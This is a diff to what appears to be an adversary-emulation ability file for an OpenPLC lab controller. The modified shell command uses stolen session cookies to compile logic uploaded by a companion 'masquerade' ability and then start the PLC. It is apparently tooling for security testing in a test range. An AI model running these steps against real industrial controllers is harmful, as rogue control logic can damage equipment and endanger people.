@@ -2,7 +2,9 @@
 
 - id: c9d0e1f2-9999-9999-9999-000000000006
   name: OpenPLC - Start PLC with Uploaded Logic
-  description: Compile and start the PLC runtime
+  description: |
+    GET /compile-program?file=<st> then GET /start_plc. Uses /tmp/plc_last_st_file.txt
+    from the masquerade upload ability.
   tactic: execution
   technique_id: T0858
   technique_name: Change Operating Mode
@@ -10,15 +12,16 @@
   - platform: linux
     name: sh
     command: >
+      FN=$(cat /tmp/plc_last_st_file.txt 2>/dev/null) &&
+      echo "COMPILE_FILE=$FN" &&
+      test -n "$FN" &&
       curl -s -b /tmp/plc_cookies.txt
-      -d "program_name=326339.st"
-      "http://192.168.95.2:8080/compile-program"
-      -o /tmp/compile.html &&
-      echo "COMPILATION_STARTED" &&
+      "http://192.168.95.2:8080/compile-program?file=$FN"
+      -o /tmp/compile_masq.html &&
+      echo "COMPILATION_TRIGGERED" &&
       sleep 15 &&
       curl -s -b /tmp/plc_cookies.txt
-      -d ""
       "http://192.168.95.2:8080/start_plc"
-      -o /tmp/start.html &&
-      echo "PLC_STARTED"
-    timeout: 120
+      -o /tmp/start_masq.html &&
+      echo "PLC_START_TRIGGERED"
+    timeout: 180
